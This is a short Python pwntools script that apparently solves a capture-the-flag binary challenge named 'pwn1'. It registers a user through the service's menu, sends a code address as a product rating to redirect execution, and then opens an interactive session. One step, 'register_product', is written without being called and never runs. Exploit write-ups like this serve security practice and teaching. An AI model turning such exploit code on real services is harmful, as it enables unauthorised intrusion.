from pwn import *


p = process('./pwn1')
p = remote('pwn1.darkarmy.xyz', 7001)
flag = int(0x0401479)

def register_user(p):
    p.sendlineafter('Enter your choice:','1')
    p.sendlineafter(' User:','sandi')

def register_product(p):
    p.sendlineafter('Enter your choice:','2')
    p.sendlineafter(' Product:','sandi')

def rate(p,rat):
    p.sendlineafter('Enter your choice:','3')
    p.sendlineafter(' User:','sandi')
    p.sendlineafter(' Product:','sandi')
    p.sendlineafter(' Rating:',str(rat))


register_user(p)
register_product
rate(p,flag)
raw_input('test')
rate(p,flag)
p.interactive()